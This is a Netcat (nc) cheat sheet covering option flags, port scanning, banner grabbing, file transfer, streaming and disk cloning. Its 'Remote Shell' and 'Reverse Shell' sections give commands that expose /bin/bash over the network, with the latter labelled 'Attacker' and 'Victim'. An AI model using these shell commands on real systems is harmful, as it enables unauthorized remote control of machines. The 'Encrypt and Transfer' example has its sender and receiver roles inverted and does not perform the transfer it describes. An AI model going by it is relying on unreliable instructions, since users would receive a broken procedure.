**Netcat (nc)**, a powerful networking utility used for reading from and writing to network connections using TCP or UDP. 

---
### 🔧 **USAGE**
`$ nc [options] [host] [port]`

---
### 📖 **DESCRIPTION**
Netcat (or `nc`) is used for:
- TCP/UDP connections    
- Port scanning    
- File transfers    
- Banner grabbing    
- Chat/messaging between systems    
- Shell access (remote/reverse)    
- IPv4 and IPv6 support    

---
### ⚙️ **Command Options**

|Option|Description|
|---|---|
|`-4`|Force IPv4 only|
|`-6`|Force IPv6 only|
|`-l`|Listen mode|
|`-v`|Verbose|
|`-n`|No DNS resolution|
|`-s`|Source port|
|`-w`|Timeout|
|`-u`|Use UDP|
|`-k`|Keep listening after disconnect|
|`-z`|Zero-I/O mode (scanning)|
|`-h`|Help|

---

### 🔍 **Port Scanning & Banner Grabbing**

|Command|Description|
|---|---|
|`nc -zvn 192.168.59.1 1-100`|Scan ports 1–100|
|`nc -zvn 192.168.59.1 80 22 443`|Scan ports 80, 22, 443|
|`nc -zvn 192.168.59.1 80`|Scan only port 80|
|`nc -zvn exyplore.com 80`|Scan port 80 of a domain|
|`nc sysxplore.com 80`|Grab banner of sysxplore.com|

---

### 💻 **Common Use Cases**

#### ✅ **Remote Shell**
```bash
# Server
$ nc -nlvp 8888 -e /bin/bash

# Client
$ nc 192.168.10.48 8888
```

#### 🔄 **Reverse Shell**
```bash
# Attacker (listener)
$ nc -nlvp 8888

# Victim (connects back)
$ nc 192.168.10.48 8888 -v -e /bin/bash
```

#### 📥 **Downloading a File**
```bash
# Sender
$ nc -lvp 8888 < data.txt

# Receiver
$ nc 192.168.10.48 8888 > data.txt
```

#### 📤 **Uploading a File**
```bash
# Receiver
$ nc -lvp 8888 > data.txt

# Sender
$ nc 192.168.10.48 8888 < data.txt
```

#### 💬 **Chat App**
```bash
# Server
$ nc -lvp 8888

# Client
$ nc 192.168.10.48 8888
```

#### 📺 **Video Streaming**
```bash
# Sender
$ cat video.avi | nc -nlvp 8888

# Receiver
$ nc 192.168.10.48 8888 | mplayer -vo x11 -cache 3000 -
```

---

### 📦 **Compress and Transfer**
```bash
# Sender
$ tar cfp - /backups | compress -c | nc 192.168.59.54 8888

# Receiver
$ nc -l -p 8888 | uncompress -c | tar xvfp -
```

---

### 🔐 **Encrypt and Transfer**
```bash
# Sender
$ nc -l -p 8888 | openssl enc -e -des3 -pass pass:password > creds.txt

# Receiver
$ openssl enc -d -des3 -pass pass:password | nc 192.168.10.48 8888
```

---

### 💽 **Cloning Linux Disk Drive**
```bash
# Sender
$ dd if=/dev/sdb | nc -l -p 8888

# Receiver
$ nc -n 192.168.10.48 8888 | dd of=/dev/sdb
```

---

### 🧠 Summary

This cheat sheet demonstrates that Netcat is like the **Swiss Army knife of networking**—versatile for:
- Security testing    
- Penetration testing    
- Simple data transfer    
- Network diagnostics